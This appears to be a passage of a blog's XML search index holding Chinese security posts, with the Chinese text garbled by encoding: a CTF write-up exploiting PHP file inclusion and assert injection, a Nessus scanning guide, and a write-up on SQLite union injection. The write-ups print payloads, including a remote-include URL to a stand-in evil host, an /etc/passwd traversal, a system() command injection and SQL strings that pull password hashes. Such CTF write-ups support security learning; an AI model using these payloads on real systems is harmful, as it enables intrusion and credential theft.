title="å¸¸ç”¨æ‰«æå·¥å…·"></a>å¸¸ç”¨æ‰«æå·¥å…·</h3></li></ol><ol><li>AWVS</li><li>Appscan</li><li>Zenmap</li><li>å¾¡å‰‘ç³»åˆ—</li><li>Maltego </li></ol>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAW CTF 2016 mfw Writeup</title>
      <link href="/2018/03/23/CSAW-CTF-2016-mfw-Writeup/"/>
      <url>/2018/03/23/CSAW-CTF-2016-mfw-Writeup/</url>
      
        <content type="html"><![CDATA[<p>i cant input chinese,so,here is my poor english !</p><a id="more"></a><h1 id="CSAW-CTF-2016-mfw-Writeup"><a href="#CSAW-CTF-2016-mfw-Writeup" class="headerlink" title="CSAW CTF 2016 mfw Writeup"></a>CSAW CTF 2016 mfw Writeup</h1><h2 id="0x01-éœ€è¦çŸ¥é“çš„"><a href="#0x01-éœ€è¦çŸ¥é“çš„" class="headerlink" title="0x01 éœ€è¦çŸ¥é“çš„"></a>0x01 éœ€è¦çŸ¥é“çš„</h2><ol><li>æœ¬åœ°æ–‡ä»¶åŒ…å«</li><li>gitæºç æ³„éœ²<h2 id="0x02-æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#0x02-æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="0x02 æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>0x02 æœ¬åœ°æ–‡ä»¶åŒ…å«</h2>æ¥è‡ªç»´åŸºç™¾ç§‘çš„è§£é‡Šï¼š</li></ol><p>In PHP the main cause is due to the use of unvalidated user-input with a filesystem function that includes a file for execution.</p><hr><p>** most notable are the include and require statements.**</p><hr><p>Most of the vulnerabilities can be attributed to novice programmers not being familiar with all of the capabilities of the PHP programming language. The PHP language has a directive which, if enabled,</p><hr><p>** allows filesystem functions to use a URL to retrieve data from remote locations**.[1]</p><hr><p> The directive is allow_url_fopen in PHP versions &lt;= 4.3.4 and allow_url_include since PHP 5.2.0. In PHP 5.x this directive is disabled by default, in prior versions it was enabled by default.[2] To exploit the vulnerability an attacker will alter a variable that is passed to one of these functions to cause it to include malicious code from a remote resource.</p><hr><p>** To mitigate this vulnerability all user input needs to be validated before being used.**</p><p>å¤§ä½“æ„æ€å°±æ˜¯è¯´ä½¿ç”¨äº† include å’Œ require çš„ä»£ç å¯èƒ½ä¼šå› ä¸ºä»£ç çš„è´¨é‡ä¸å¥½ï¼Œæ²¡æœ‰å¯¹ä¼ å…¥çš„å˜é‡è¿›è¡Œæ£€æµ‹ï¼Œå¯¼è‡´å…è®¸è¿œç¨‹ä¸»æœºä½¿ç”¨URLé‡Œçš„æ¶æ„ä»£ç ä»æ–‡ä»¶ç³»ç»Ÿé‡Œè·å–åˆ°æ•æ„Ÿæ–‡ä»¶ä¿¡æ¯ã€‚</p><p>Exampleï¼š</p><pre><code>&lt;?php   if ( isset( $_GET[&apos;language&apos;] ) ) {  include( $_GET[&apos;language&apos;] . &apos;.php&apos; );   }?&gt;&lt;form method=&quot;get&quot;&gt;   &lt;select name=&quot;language&quot;&gt;      &lt;option value=&quot;english&quot;&gt;English&lt;/option&gt;      &lt;option value=&quot;french&quot;&gt;French&lt;/option&gt;      ...   &lt;/select&gt;   &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;</code></pre><p>ä»¥ä¸‹æ˜¯payload:</p><pre><code>/vulnerable.php?language=http://evil.example.com/webshell.txt? - injects a remotely hosted file containing a malicious code (remote file include)/vulnerable.php?language=C:\\ftp\\upload\\exploit - Executes code from an already uploaded file called exploit.php (local file inclusion vulnerability)/vulnerable.php?language=C:\\notes.txt%00 - example using NULL meta character to remove the .php suffix, allowing access to files other than .php. This use of null byte injection was patched in PHP 5.3, and can no longer be used for LFI/RFI attacks.[5]/vulnerable.php?language=../../../../../etc/passwd%00 - allows an attacker to read the contents of the /etc/passwd file on a Unix system through a directory traversal attack.</code></pre><h2 id="0x03-gitæºç æ³„éœ²"><a href="#0x03-gitæºç æ³„éœ²" class="headerlink" title="0x03 gitæºç æ³„éœ²"></a>0x03 gitæºç æ³„éœ²</h2><p>ä½¿ç”¨gitåœ¨åˆå§‹åŒ–ä»£ç åº“çš„æ—¶å€™ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹äº§ç”Ÿä¸€ä¸ª.gitçš„éšè—ç›®å½•ï¼Œç”¨æ¥è®°å½•ä»£ç çš„å˜æ›´ç­‰ã€‚åŒæ—¶ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶å¯ä»¥æ¢å¤å„ä¸ªç‰ˆæœ¬çš„ä»£ç ï¼Œæ‰€ä»¥å¦‚æœ.gitæ–‡ä»¶å¯ä»¥è®¿é—®ï¼Œå°±å¯èƒ½æ³„éœ²äº†æºä»£ç ã€‚</p><h2 id="0x04-é¢˜ç›®"><a href="#0x04-é¢˜ç›®" class="headerlink" title="0x04 é¢˜ç›®"></a>0x04 é¢˜ç›®</h2><p><img src="https://i.imgur.com/1cGM2Pl.png" alt></p><p>æŸ¥çœ‹æºç ï¼Œå‘ç°å¯èƒ½çš„æ¼æ´</p><p><img src="https://i.imgur.com/Qutnt0L.png" alt></p><p>äºæ˜¯æˆ‘ä»¬å°è¯•ç”¨æ–‡ä»¶åŒ…å«æ¥è·å–å¯†ç ä¿¡æ¯</p><pre><code>http://111.198.29.45:31930/?page=../../../../../etc/passwd</code></pre><p>å‘ç°è¢«è¿‡æ»¤äº†ã€‚flagé¡µé¢å¯èƒ½ä½œä¸ºéšè—å˜é‡äº†ã€‚</p><p>çœ‹åˆ°abouté¡µé¢è¯´ä½¿ç”¨äº†git</p><p><img src="https://i.imgur.com/qHNE2ot.png" alt></p><p>æƒ³åˆ°.gitæºç æ³„éœ²ï¼Œè®¿é—®.gitæ–‡ä»¶ï¼Œå‘ç°å¯ä»¥è®¿é—®</p><p><img src="https://i.imgur.com/V87suOa.png" alt></p><p>æˆ‘ä»¬ä½¿ç”¨ å·¥å…·GitHackå°†ç½‘ç«™æºç cloneä¸‹æ¥ã€‚</p><blockquote><p><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p></blockquote><p>GitHackçš„å·¥ä½œåŸç†æ˜¯</p><blockquote><p>GitHackæ˜¯ä¸€ä¸ª.gitæ³„éœ²åˆ©ç”¨è„šæœ¬ï¼Œé€šè¿‡æ³„éœ²çš„.gitæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ï¼Œé‡å»ºè¿˜åŸå·¥ç¨‹æºä»£ç ã€‚<br>æ¸—é€æµ‹è¯•äººå‘˜ã€æ”»å‡»è€…ï¼Œå¯ä»¥è¿›ä¸€æ­¥å®¡è®¡ä»£ç ï¼ŒæŒ–æ˜ï¼šæ–‡ä»¶ä¸Šä¼ ï¼ŒSQLæ³¨å°„ç­‰webå®‰å…¨æ¼æ´ã€‚</p></blockquote><p>ä½¿ç”¨å‘½ä»¤ï¼š</p><pre><code>&gt;python2 GitHack.py http://111.198.29.45:31930/.git/</code></pre><p>åœ¨flag.phpæ–‡ä»¶ä¸­åªæœ‰ï¼š</p><pre><code>&lt;?php// TODO// $FLAG = &apos;&apos;;?&gt;</code></pre><p>æ²¡ä»€ä¹ˆå¸®åŠ©ï¼Œå»index.phpé‡ŒæŸ¥çœ‹ï¼š</p><pre><code>&lt;?phpif (isset($_GET[&apos;page&apos;])) {$page = $_GET[&apos;page&apos;];} else {    $page = &quot;home&quot;;}$file = &quot;templates/&quot; . $page . &quot;.php&quot;;// I heard &apos;..&apos; is dangerous!assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);// TODO: Make this look niceassert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;);?&gt;</code></pre><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯å‡ºç°çš„è¿™å‡ ä¸ªå‡½æ•°</p><p>strops:<br>è¿”å›å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ä¸²åˆ™è¿”å› FALSE.</p><p>assert:*<em>å¦‚æœ assertion æ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢« assert() å½“åš PHP ä»£ç æ¥æ‰§è¡Œã€‚<br>*</em></p><p>åˆçœ‹åˆ°ä»£ç å¯¹è¾“å…¥çš„pageå˜é‡æ²¡æœ‰æ£€æµ‹ï¼Œè¿™å°±æ˜¯è¯´æˆ‘ä»¬æœ‰æœºä¼šå¯¹å…¶æ”¹é€ ï¼Œä½¿å…¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚<br>ä¸‹é¢æ˜¯å¤§ç¥çš„payload:</p><pre><code>flag&apos;,&apos;..&apos;)+or+system(&apos;cat+templates/flag.php&apos;);//</code></pre><p>æ³¨æ„åˆ°assertè¯­å¥é‡Œçš„stropsæ˜¯å•å¼•å·ï¼Œæˆ‘ä»¬å°±å°†å…¶é—­åˆï¼Œå¹¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤è·å–flag.phpæ–‡ä»¶å†…å®¹ï¼ŒåŒæ—¶å°†åé¢çš„dieè¯­å¥æ³¨é‡Šæ‰ã€‚</p><p>å¤§ç¥å°±æ˜¯å¤§ç¥ï¼</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nessus ä½¿ç”¨æŒ‡å—</title>
      <link href="/2018/02/23/Nessus%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2018/02/23/Nessus%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<p>NESSUS æ˜¯ç›®å‰å…¨ä¸–ç•Œæœ€å¤šäººä½¿ç”¨çš„ç³»ç»Ÿæ¼æ´æ‰«æä¸åˆ†æè½¯ä»¶ã€‚æ€»å…±æœ‰è¶…è¿‡75,000ä¸ªæœºæ„ä½¿ç”¨NESSUS ä½œä¸ºæ‰«æè¯¥æœºæ„ç”µè„‘ç³»ç»Ÿçš„è½¯ä»¶ã€‚</p><a id="more"></a><h1 id="Nessus-ä½¿ç”¨æŒ‡å—"><a href="#Nessus-ä½¿ç”¨æŒ‡å—" class="headerlink" title="Nessus ä½¿ç”¨æŒ‡å—"></a>Nessus ä½¿ç”¨æŒ‡å—</h1><h2 id="0x01åˆ›å»ºç­–ç•¥"><a href="#0x01åˆ›å»ºç­–ç•¥" class="headerlink" title="0x01åˆ›å»ºç­–ç•¥"></a>0x01åˆ›å»ºç­–ç•¥</h2><p>è¿›å…¥ä¸»é¡µé¢åç‚¹å‡»policies</p><p><img src="https://i.imgur.com/UKPKn8z.png" alt></p><p>ç„¶ååˆ›å»ºä¸€ä¸ªæ–°ç­–ç•¥</p><p><img src="https://i.imgur.com/kcgt20y.png" alt></p><p>è¿›å»åä¼šæœ‰å·²ç»åˆ—å‡ºçš„ç­–ç•¥é€‰é¡¹ï¼Œæˆ‘ä»¬ç‚¹å‡»Advanced Scanï¼Œé«˜çº§æ‰«æ</p><p><img src="https://i.imgur.com/Gq2m3ET.png" alt></p><h2 id="0x02é…ç½®ç­–ç•¥"><a href="#0x02é…ç½®ç­–ç•¥" class="headerlink" title="0x02é…ç½®ç­–ç•¥"></a>0x02é…ç½®ç­–ç•¥</h2><p>åœ¨Advanced Scanä¸­ä¼šçœ‹åˆ°é™¤äº†Credentials(ç™»å½•æ‰«æ)è¿˜å¤šäº†ä¸¤é¡¹Compliance(åˆè§„æ€§æ£€æµ‹)å’ŒPlugins(æ‰«ææ’ä»¶)é…ç½®ã€‚</p><p><img src="https://i.imgur.com/3942etv.png" alt></p><p>åœ¨è¿™é‡Œæˆ‘ä»¬è¿›è¡Œå¸¸è§„çš„çš„é…ç½®ã€‚</p><h2 id="0x03é«˜çº§é…ç½®"><a href="#0x03é«˜çº§é…ç½®" class="headerlink" title="0x03é«˜çº§é…ç½®"></a>0x03é«˜çº§é…ç½®</h2><p>ç”±äºå…¶ä»–é…ç½®ä¸åŸºç¡€æ‰«ææ—¶ä¸€è‡´çš„æ‰€ä»¥ï¼Œç°åœ¨é‡ç‚¹ä»‹ç»ä¸‹é«˜çº§æ‰«æçš„DISCOVERYï¼ŒASSESSMENTï¼ŒCredentialsé¦–å…ˆæ˜¯DISCOVERYï¼Œè¿™ä¸ªæ ç›®åŒ…å«Host Discovery(ä¸»æœºå‘ç°)ï¼ŒPort Scanning(ç«¯å£å‘ç°)ï¼ŒService Discovery(æœåŠ¡å‘ç°)ã€‚ä¸»æœºå‘ç°ä¸­ä¸€èˆ¬è¦å¼€å¯PingåŠŸèƒ½å…¶ä»–çš„éœ€è¦æŒ‰ç…§éœ€æ±‚è¿›è¡Œé…ç½®ï¼Œæ¯”è¾ƒå…¨é¢çš„æ‰«æå»ºè®®å‹¾é€‰Ping Methodsä¸­UDPé€‰é¡¹ï¼Œä¼šé™ä½æ•ˆç‡,å’Œå‡†ç¡®æ€§ï¼Œç”±äºæ—¥å¸¸èµ„äº§æ”¶é›†åªå¯¹æœåŠ¡å™¨è¿›è¡Œèµ„äº§ç»Ÿè®¡ï¼Œä¸å¯¹ç½‘ç»œè®¾å¤‡å’Œæ‰“å°æœºç­‰è¿›è¡Œç»Ÿè®¡ï¼Œæ‰€ä»¥Fragile Devicesä¸­çš„å†…å®¹ä¸è¿›è¡Œè®¾ç½®ã€‚</p><p><img src="https://i.imgur.com/kgFBF1n.png" alt></p><p><img src="https://i.imgur.com/lyNUsGP.png" alt></p><p>æ¥ä¸‹æ¥è¿›è¡Œç«¯å£æ‰«æï¼Œåœ¨è¿›è¡Œå¸¸è§„æ‰«ææ—¶æˆ‘ä»¬æŒ‰ç…§é»˜è®¤çš„è®¾ç½®å°±å¯ä»¥å®Œæˆæ‰«æï¼Œéœ€è¦è¿›è¡Œå…¨éƒ¨ç«¯å£çš„æ‰«ææˆ–è€…è¿›è¡Œé˜²ç«å¢™æ¢æµ‹æ—¶æˆ‘ä»¬å°±éœ€è¦è‡ªå®šä¹‰å‚æ•°</p><p><img src="https://i.imgur.com/FV29K9J.png" alt="ç«¯å£æ‰«æ"></p><p>æ¥ä¸‹æ¥çš„æœåŠ¡å‘ç°æˆ‘ä»¬ä¹Ÿéœ€è¦å°†å‘ç°èŒƒå›´è®¾ç½®ä¸ºå…¨éƒ¨ç«¯å£ä»¥æé«˜å‡†ç¡®ç‡</p><p><img src="https://i.imgur.com/t22LNhe.png" alt></p><p>ä¸‹é¢çš„ASSESSMENT(å®‰å…¨è®¤è¯)/Generealä¸€èˆ¬ä¸éœ€è®¾ç½®ï¼Œè¿™é‡Œå°±çœç•¥ã€‚</p><p>Brute Force å‹¾é€‰General Settingså¯ä»¥é˜²æ­¢è´¦å·è¢«é”å®šã€‚</p><p><img src="https://i.imgur.com/TDQot05.png" alt></p><p> åœ¨Settings / assessment / Web Applicationsï¼Œå¯ä»¥å¯¹Webåº”ç”¨è¿›è¡Œæµ‹è¯•ï¼Œå¯ä»¥æ ¹æ®å®é™…éœ€æ±‚è¿›è¡Œé…ç½®ã€‚</p><p><img src="https://i.imgur.com/IDjSxs4.png" alt></p><p>Windowsé€‰é¡¹ä¸­å¯ä»¥æšä¸¾SMBåŸŸï¼Œä¸€èˆ¬ä½¿ç”¨é»˜è®¤é…ç½®ã€‚</p><p>åœ¨REPORTä¸­åªéœ€è®¾ç½®æŠ¥å‘Šçš„è¯¦ç»†ç¨‹åº¦</p><p><img src="https://i.imgur.com/6PGS6CP.png" alt></p><p>åœ¨Credentialsä¸­æˆ‘ä»¬å¯ä»¥è¿›è¡Œç™»é™†æ‰«æ</p><p><img src="https://i.imgur.com/cTbfXjS.png" alt></p><p>åœ¨Pluginsä¸­æˆ‘ä»¬å¯ä»¥è¿›è¡Œå…·ä½“çš„æ’ä»¶é€‰æ‹©</p><p><img src="https://i.imgur.com/SREIZoC.png" alt></p><p>ç‚¹å‡»SAVEåæˆ‘ä»¬æ–°å»ºä¸€ä¸ªæ‰«æ</p><p><img src="https://i.imgur.com/Vgc0e1i.png" alt></p><p><img src="https://i.imgur.com/UHO2Yt8.png" alt></p><p>ç‚¹å‡»Launchå¼€å§‹æ‰«æ</p><h2 id="ç”Ÿæˆç»“æœæŠ¥å‘Š"><a href="#ç”Ÿæˆç»“æœæŠ¥å‘Š" class="headerlink" title="ç”Ÿæˆç»“æœæŠ¥å‘Š"></a>ç”Ÿæˆç»“æœæŠ¥å‘Š</h2><p>æŸ¥çœ‹å·²å®Œæˆçš„æ‰«æå¯ä»¥çœ‹åˆ°å…·ä½“çš„æ¼æ´ä¿¡æ¯</p><p><img src="https://i.imgur.com/gDNENXH.png" alt></p><p>å°†ç»“æœå¯¼å‡º</p><p><img src="https://i.imgur.com/PDT3Ran.png" alt></p><p>åœ¨ç”Ÿæˆçš„æŠ¥å‘Šä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç›¸å…³ä¿¡æ¯</p><p><img src="https://i.imgur.com/OjRYT2I.png" alt></p><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>Nessusæ˜¯ä¸€æ¬¾éå¸¸å¼ºå¤§çš„æ¼æ´æ‰«æä¸åˆ†æè½¯ä»¶ï¼Œæˆ‘ä»¬ç”šè‡³å¯ä»¥æ‰¾åˆ°æŸä¸€ä¸ªæ¼æ´çš„CVEå·æ¥è¿›è¡Œé’ˆå¯¹ä¸æŸä¸€å…·ä½“å·²å…¬å¸ƒçš„æ¼æ´æ¥è¿›è¡Œæ‰«æã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯åœ¨è¿›è¡Œæ‰«æä¹‹å‰æˆ‘ä»¬åº”è¯¥æœ‰ç›®çš„çš„è¿›è¡Œæ‰«æï¼Œå¦‚æœç›²ç›®çš„æ‰«ä¸ä»…æµªè´¹æ—¶é—´è€Œä¸”æ‰«æçš„ç»“æœå¹¶ä¸å¥½ã€‚</p><p>è¿™é‡Œç»™å‡ºå‡ ä¸ªå…¬å¸ƒæ¼æ´çš„ç½‘ç«™ï¼Œæ–¹ä¾¿æŸ¥è¯¢ï¼š</p><ul><li><blockquote><p><a href="http://www.anquan.us/" target="_blank" rel="noopener">http://www.anquan.us/</a></p><p><a href="https://bugs.leavesongs.com/" target="_blank" rel="noopener">https://bugs.leavesongs.com/</a></p><p><a href="https://wooyun.website/" target="_blank" rel="noopener">https://wooyun.website/</a></p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å·¥å…· </tag>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackLu FlatScience WP</title>
      <link href="/2017/03/23/HackLu-Flatscience-WP/"/>
      <url>/2017/03/23/HackLu-Flatscience-WP/</url>
      
        <content type="html"><![CDATA[<p>its so hard for me to write script!</p><a id="more"></a><h1 id="HackLu-FlatScience-WP"><a href="#HackLu-FlatScience-WP" class="headerlink" title="HackLu FlatScience WP"></a>HackLu FlatScience WP</h1><hr><h2 id="0x01-ç”¨åˆ°çš„ä¸œè¥¿"><a href="#0x01-ç”¨åˆ°çš„ä¸œè¥¿" class="headerlink" title="0x01 ç”¨åˆ°çš„ä¸œè¥¿"></a>0x01 ç”¨åˆ°çš„ä¸œè¥¿</h2><ol><li>robots.txt</li><li>å¯¹sqliteæ•°æ®åº“äº†è§£</li><li>ä»£ç å®¡è®¡</li><li>sqlæ³¨å…¥</li><li>pythonå†™çˆ†ç ´è„šæœ¬</li></ol><h2 id="0x02-robots-txt"><a href="#0x02-robots-txt" class="headerlink" title="0x02 robots.txt"></a>0x02 robots.txt</h2><p>åˆšæ‹¿åˆ°é¢˜ç¡®å®ä¸€ç­¹è«å±•ï¼Œæ²¡ä»€ä¹ˆç»éªŒã€‚æŸ¥çœ‹robotsæ–‡ä»¶ä¹‹åå°è¯•ç™»å½•./login.php</p><p><img src="https://i.imgur.com/E9wLCCI.png" alt="robots.txt"></p><p><img src="https://i.imgur.com/kJafN4R.png" alt="login.php"></p><h2 id="0x03-SQLite-æ•°æ®åº“ç»“æ„"><a href="#0x03-SQLite-æ•°æ®åº“ç»“æ„" class="headerlink" title="0x03 SQLite æ•°æ®åº“ç»“æ„"></a>0x03 SQLite æ•°æ®åº“ç»“æ„</h2><ol><li><p>SQLite3æ•°æ®åº“Sql_masterè¡¨ç»“æ„</p><ol><li><p>å‚¨å­˜åœ¨æ ¹é¡µä¸­ï¼Œæ˜¯ç³»ç»Ÿè¡¨ï¼Œä¸mysqlä¸­çš„information_schemaè¡¨ç±»ä¼¼ï¼Œå‚¨å­˜äº†è¯¥æ•°æ®åº“ä¸­å„ä¸ªè¡¨çš„ä¿¡æ¯çš„å»ºè¡¨SQLè¯­å¥ã€‚</p></li><li><p>å¦‚å›¾<img src="https://i.imgur.com/lSrD5AX.png" alt="SQLite3ç»“æ„"></p></li><li><p>åŸºç¡€çš„æŸ¥è¯¢è¯­å¥æœ‰<br><code>select * from sqlite_master WHERE type=&quot;table&quot;;</code> å¯ä»¥æŸ¥è¯¢åˆ°å½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰è¡¨çš„è¯¦ç»†ä¿¡æ¯ã€‚</p><h2 id="0x04-ä»£ç å®¡è®¡"><a href="#0x04-ä»£ç å®¡è®¡" class="headerlink" title="0x04 ä»£ç å®¡è®¡"></a>0x04 ä»£ç å®¡è®¡</h2><p>ä¼ å…¥debugä¹‹åå¾—åˆ°æºç </p><p><a href="http://111.198.29.45:30157/login.php?debug" target="_blank" rel="noopener">http://111.198.29.45:30157/login.php?debug</a></p><?phpif(isset($_POST['usr']) && isset($_POST['pw'])){ $user = $_POST['usr']; $pass = $_POST['pw']; $db = new SQLite3('../fancy.db'); $res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");if($res){ $row = $res->fetchArray();}else{ echo "<br>Some Error occourred!";}if(isset($row['id'])){     setcookie('name',' '.$row['name'], time() + 60, '/');     header("Location: /");     die();}}if(isset($_GET['debug']))highlight_file('login.php');?><p> </p></li></ol></li></ol><p>å¯ä»¥çœ‹å‡ºä½¿ç”¨äº†SQLite3æ•°æ®åº“ï¼Œå¯¹postçš„å‚æ•°æ²¡æœ‰è¿‡æ»¤ç›´æ¥è¿›è¡Œäº†æŸ¥è¯¢ã€‚å¦‚æœæŸ¥è¯¢åˆ°äº†idå°±æ‰§è¡Œsetcookieæ“ä½œï¼Œå°†nameå­—æ®µå†…å®¹åŠ è¿›cookieé‡Œï¼Œæ—¶é—´+60sã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•POSTå‚æ•°æ³¨å…¥ã€‚</p><p>  <code>usr=admin&#39; union select name,sql from sqlite_master limit 1,1--+&amp;pw=admin</code></p><p>è¿™æ—¶æ‰§è¡Œçš„æŸ¥è¯¢è¯­å¥å°±å˜æˆäº†è¿™æ ·</p><p><code>SELECT id,name from Users where name=&#39;admin&#39; union select name,sql from sqlite_master limit 1,1-- and password=&#39;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&#39;</code><br>æŸ¥çœ‹è¿”å›çš„cookieï¼Œnameçš„valueæ˜¯æŸ¥åˆ°çš„sqlå»ºè¡¨è¯­å¥ï¼Œidæ˜¯æŸ¥åˆ°çš„name.</p><p><img src="https://i.imgur.com/NnolACR.png" alt="cookieçš„å€¼"><br>å¯ä»¥çœ‹å‡ºæ•°æ®åº“çš„ç»“æ„æ˜¯</p><pre><code> CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))</code></pre><p>è¿™æ ·å°±çŸ¥é“äº†è¡¨åå’Œå­—æ®µåï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥å¾—åˆ°å†…å®¹</p><pre><code>    &apos; union select id,name from Users limit 0,1&apos; union select id,password from Users limit 0, 1&apos; union select id,hint from Users limit 0,1</code></pre><p>å…·ä½“å†…å®¹å¦‚ä¸‹<br><img src="https://i.imgur.com/ynG34iE.png" alt></p><p>å°è¯•CMD5ç ´è§£adminçš„å¯†ç ï¼Œæ²¡æŸ¥å‡ºæ¥ï¼Œæ ¹æ®hintç”¨ç½‘ç«™çš„pdfé‡Œé¢çš„è¯çˆ†ç ´ã€‚ï¼ˆä¹Ÿå¯ä»¥çœ‹åˆ°å¯†ç è¿›è¡Œäº†SHA1+saltçš„åŠ å¯†ï¼‰</p><h2 id="0x05-pythonçˆ†ç ´"><a href="#0x05-pythonçˆ†ç ´" class="headerlink" title="0x05 pythonçˆ†ç ´"></a>0x05 pythonçˆ†ç ´</h2>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
